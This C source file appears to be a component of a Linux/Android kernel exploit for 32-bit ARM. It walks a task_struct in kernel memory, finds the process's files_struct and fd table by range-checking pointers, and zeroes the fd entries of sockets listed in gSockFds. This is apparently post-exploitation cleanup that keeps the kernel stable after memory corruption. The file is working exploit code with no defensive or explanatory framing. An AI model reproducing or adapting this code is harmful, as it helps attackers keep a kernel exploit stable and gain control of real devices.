#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define KERNEL_START_ADDR 	0xC0008000U
#define KERNEL_END_ADDR		( KERNEL_START_ADDR + 1024 * 1024 * 800 )

struct rcu_head {
	struct rcu_head *next;
	void (*func)(struct rcu_head *head);
};

struct fdtable {
	unsigned int 	max_fds;
	//struct file **fd;      /* current fd array */
	unsigned int** 	fd;
	void* close_on_exec;
	void* open_fds;
	struct rcu_head rcu;
	struct fdtable *next;
};

struct files_struct {//struct files_struct *files;
	int count;
	struct fdtable *fdt;
	struct fdtable fdtab;
	/* ...... */
};

#define PARENT_PROCESS_FDS 		0x1F4

int filesStructInTaskStructCnt = 0;
int testStructCnt = 0;
unsigned int testMaxFdsCnt = 0;
extern int gSockFds[PARENT_PROCESS_FDS];

void setValue(int value){
	if( testStructCnt < value ){
		testStructCnt = value;
	}
}

int redressFileFds(unsigned int* task_struct){
	struct files_struct* files_structAddr;
	struct fdtable* fdtableAddr;
	int fileStructCnt = 0;
	unsigned int tmpFdAddr = 0;

	if((unsigned int)task_struct < 0xC0008000U){
		return -1;
	}
	setValue(1);
	for(int i=0; i<100; i++){
		if( *(task_struct+i) < KERNEL_START_ADDR || *(task_struct+i) > KERNEL_END_ADDR){
			continue;
		}
		setValue(2);
		if( *(task_struct+i+1) < KERNEL_START_ADDR || *(task_struct+i+1) > KERNEL_END_ADDR){
			continue;
		}
		setValue(3);
		if( *(task_struct+i+2) < KERNEL_START_ADDR || *(task_struct+i+2) > KERNEL_END_ADDR){
			continue;
		}
		setValue(4);
		if( *(task_struct+i+3) < KERNEL_START_ADDR || *(task_struct+i+3) > KERNEL_END_ADDR){
			continue;
		}
		setValue(5);
		if( *(task_struct+i+4) < KERNEL_START_ADDR || *(task_struct+i+4) > KERNEL_END_ADDR){
			continue;
		}
		setValue(6);

		files_structAddr = (struct files_struct*)*(task_struct+i+1);
		if( files_structAddr->count > 1000000){
			continue;
		}
		setValue(7);
		if( (unsigned int)files_structAddr->fdt < KERNEL_START_ADDR || (unsigned int)files_structAddr->fdt > KERNEL_END_ADDR){
			continue;
		}
		setValue(8);

		fdtableAddr = (struct fdtable*)files_structAddr->fdt;

		if(testMaxFdsCnt < fdtableAddr->max_fds){
			testMaxFdsCnt = fdtableAddr->max_fds;
		}
		setValue(9);
		if( (unsigned int)fdtableAddr->fd < KERNEL_START_ADDR || (unsigned int)fdtableAddr->fd > KERNEL_END_ADDR){
			continue;
		}
		setValue(10);

		for(int j=0; j<fdtableAddr->max_fds; j++){
			tmpFdAddr = *(unsigned int*)(fdtableAddr->fd+j);
			if( tmpFdAddr < KERNEL_START_ADDR || tmpFdAddr > KERNEL_END_ADDR){
				continue;
			}
			setValue(11);
			fileStructCnt++;
			if(fileStructCnt > 100){
				filesStructInTaskStructCnt++;
				setValue(12);
				break;
			}
		}
		if(filesStructInTaskStructCnt){
			for(int k=0; k<PARENT_PROCESS_FDS; k++){
				if( gSockFds[k] < fdtableAddr->max_fds ){
					*( fdtableAddr->fd + gSockFds[k] ) = 0;
				}
			}
			return 0;
		}
	}

	return filesStructInTaskStructCnt;
}



